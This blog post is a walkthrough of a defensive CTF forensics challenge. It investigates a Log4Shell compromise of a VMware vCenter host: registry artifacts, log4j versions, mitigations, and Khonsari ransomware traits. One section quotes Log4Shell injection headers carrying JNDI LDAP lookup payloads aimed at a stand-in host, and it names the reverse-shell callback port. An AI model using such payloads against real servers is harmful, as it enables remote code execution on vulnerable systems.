---
layout: post
title: Detecting and defending against log4j attacks
categories:
- CTF
- Forensics
tags:
- CTF
- Windows-Forensics
- Log4j
- Log4shell
- Reverse-Engineering
date: 2022-02-19 15:45 +0800
---
Point: 2000

<a href="https://cyberdefenders.org/blueteam-ctf-challenges/progress/rootware/86/"><img src="https://img.shields.io/badge/completed-detectlog4j-brightgreen.svg" /></a>

## Category

Forensics, Reverse-engineering

## Challenge Details

For the last week, log4shell vulnerability has been gaining much attention not for its ability to execute arbitrary commands on the vulnerable system but for the wide range of products that depend on the log4j library. Many of them are not known till now. We created a challenge to test your ability to detect, analyze, mitigate and patch products vulnerable to log4shell.

## Solution

### 1. What is the computer hostname?

**hostname: VCW65**

The computer hostname can be found in the network setup log file which is recording the domain join activity. The path to the file is `C:\Windows\debug\NetSetup.LOG`

![netsetup](/assets/img/blogImages/log4j/log4jq1.png)

## 2. What is the Timezone of the compromised machine?

**UTC-8**

Using Autopsy, you are able to view registry files through `SYSTEM` registry in the following path:

`C:\Windows\System32\config\SYSTEM`

Open the `SYSTEM` registry file > go to ControlSet001 > Control > TimeZoneInformation > TimeZoneKeyName

![timezone](/assets/img/blogImages/log4j/log4jq2.png)

`Pacific Standard Time`

We can see that the time zone is in PST. By default PST and UTC have difference of 8 hours

### 3. What is the current build number on the system?

**The current build number is 14393.**

The current windows build number can be found via `SOFTWARE` registry within Autopsy via this path.

`C:\Windows\System32\config\SOFTWARE`

Open the `SOFTWARE` registry file > Microsoft > Windows NT > CurrentVersion

![buildversion](/assets/img/blogImages/log4j/log4jq3.png)

### 4. What is the computer IP?

**The IP address is 192.168.112.139**

The IP address of the computer can be found in previous `SYSTEM` registry as follow.

Open the `SYSTEM` registry file > go to ControlSet002 > Services > Tcpip > Parameters > Interfaces > `{82e9...}`

![ipaddress](/assets/img/blogImages/log4j/log4jq4.png)

### 5. What is the domain computer was assigned to?

**cyberdefenders.org**

The domain of the computer can be found in previous `SYSTEM` registry as follow.

Open the `SYSTEM` registry file > go to ControlSet002 > Services > Tcpip > Parameters

![domain](/assets/img/blogImages/log4j/log4jq5.png)

### 6. When was myoussef user created?

**2021-12-28 06:57:23 UTC**

From Autopsy, go to OS Accounts under the tree view on the left and search for the user **myoussef** in the results as below.

![image](/assets/img/blogImages/log4j/log4jq6.png)

### 7. What is the user mhasan password hint?

<https://www.linkedin.com/in/0xmohamedhasan/>

We can see from the results that mhasan's password hint is a linkedin profile.

![image](/assets/img/blogImages/log4j/log4jq7.png)

### 8. What is the version of the VMware product installed on the machine?

**6.7.0.40322**

The version of VMWare product installed can be checked via *Installed programs* can be shown under *Data Artifacts* > *Installed Programs*

![image](/assets/img/blogImages/log4j/log4jq8.png)

### 9. What is the version of the log4j library used by the installed VMware product?

**2.11.2**

The version of log4j library VMWare product is using can be checked in the following path via Autopsy.

`C:\Program Files\VMWare\vCenter Server\common-jars\log4j-core-2.11.2jar`

### 10. What is the log4j library log level specified in the configuration file?

**info**

This needed some digging as the log4j.properties is the main config file that keeps log4j configurations in key-value pairs. So a keyword search was done via Autopsy to look for log4j.properties file within the disk.

![image](/assets/img/blogImages/log4j/log4jq10.png)

### 11. The attacker exploited log4shell through an HTTP login request. What is the HTTP header used to inject payload?

`X-Forwarded-For`

By searching around on google for log4shell exploit through HTTP header I come across a [blog](https://runpanther.io/blog/panthers-guide-to-log4j-exploitation-prevention-and-detection/) using below headers to inject the payload.

```text
Referer=${jndi:ldap://example.com/…}
X-Forwarded-For=${jndi:ldap://example.com/…}
User-Agent=${jndi:ldap://example.com/…}
```

With the hint given in the question, the answer was deduced.

### 12. The attacker used the log4shell.huntress.com payload to detect if vcenter instance is vulnerable. What is the first link of the log4huntress payload?

**log4shell.huntress.com:1389/b1292f3c-a652-4240-8fb4-59c43141f55a**

A search for the keyword “log4shell.huntress.com” is crafted, then found a websso.log in the Result Viewer. From the result viewer the first link of log4shell payload can be found.

### 13. When was the first successful login to vsphere WebClient?

**28/12/2021 20:39:29 UTC**

The login event can be found via VMWare's `audit_events.log` found in the path below via Autopsy.

`C:\Program Files\VMWare\vCenterServer\runtime\VMWareSTSService\logs\audit_events.log`

### 14. What is the attacker's IP address?

**192.168.112.128**

The attacker's ip address can be found via the same `audit_events.log` via Autopsy.

`C:\Program Files\VMWare\vCenterServer\runtime\VMWareSTSService\logs\audit_events.log`

### 15. What is the port the attacker used to receive the cobalt strike reverse shell?

**1337**

Cobalt Strike is usually used with a Base64 encoded PowerShell command. The lowest hanging fruit would be to identify the attack by going through `Microsoft-Windows-PowerShell%4Operational.evtx`. Sure enough a Base64 encoded was found in the logs which decodes to `192.168.112:128:1337`

### 16. What is the script name published by VMware to mitigate log4shell vulnerability?

**vc_log4j_mitigator.py**

By digging on google, VMWare has published a [blog](https://kb.vmware.com/s/article/87081) on mitigating the vulnerability.

### 17. In some cases, you may not be able to update the products used in your network. What is the system property needed to set to 'true' to work around the log4shell vulnerability?

**log4j2.formatMsgNoLookups**

By googling *change system property to mitigate log4shell vulnerability*, an article published by [jfrog] has stated a mitigation method that disables lookups by setting the system property as below.

`log4j2.formatMsgNoLookups=True`

### 18. What is the log4j version which contains a patch to CVE-2021-44228?

**2.15.0**

### 19. Removing JNDIlookup.class may help in mitigating log4shell. What is the sha256 hash of the JNDILookup.class?

`0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e`

Simply extract the `log4j-core-2.11.2jar` file from the below path via Autopsy.

`C:\Program Files\VMWare\vCenter Server\common-jars\log4j-core-2.11.2jar`

The `JndiLookup.class` file needs to be further extracted from `log4j-core-2.11.2jar`. This can be done using 7zip or any unzipping software.

Once that file is extracted, sha256 hash of the class can be computed as below.

```powershell
Get-FileHash .\JndiLookup.class | Format-List                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Algorithm : SHA256                                                                                                                                                    Hash      : 0F038A1E0AA0AFF76D66D1440C88A2B35A3D023AD8B2E3BAC8E25A3208499F7E                                                                                                                               Path      : C:\Users\uname\Desktop\Log4shell\log4j-core-2.11.2\org\apache\logging\log4j\core\lookup\JndiLookup.class
```

### 20. Analyze JNDILookup.class. What is the value stored in the CONTAINER_JNDI_RESOURCE_PATH_PREFIX variable?

**java:comp/env/**

The `CONTAINER_JNDI_RESOURCE_PATH_PREFIX` can be found in the path below.

`C:\Program Files\VMWare\vCenter Server\cm\lib\log4j-core.jar`

### 21. What is the executable used by the attacker to gain persistence?

**baaaackdooor.exe**

The exe can be discovered in the below path.

`C:\Users/Administrator.WIN-B633EO9K91M\NTUSER.DAT`

Click on `NTUSER.DAT` and expand SOFTWARE > Microsoft > Windows > CurrentVersion, then click on RunOnce

![image](/assets/img/blogImages/log4j/log4jq21.png)

### 22. When was the first submission of ransomware to virustotal?

**2021-12-11 22:57:01**

The hash `f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789` of `baaaackdooor.exe` can be searched on Virustotal for First Submission under history.

### 23. The ransomware downloads a text file from an external server. What is the key used to decrypt the URL?

**"GoaahQrC"**

More research is done on this ransomeware via virustotal an detailed article on khonsari malware for apache log4j is found and was able to get the key to decrypt.

<https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/>

### 24. What is the ISP that owns that IP that serves the text file?

**amazon**

This can be found from the previous Virustotal results.

<https://www.virustotal.com/gui/file/f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789/relations>

### 25. The ransomware check for extensions to exclude them from the encryption process. What is the second extension the ransomware checks for?

The extension is **ini** as mentioned in the same report from question 23.
<https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/>
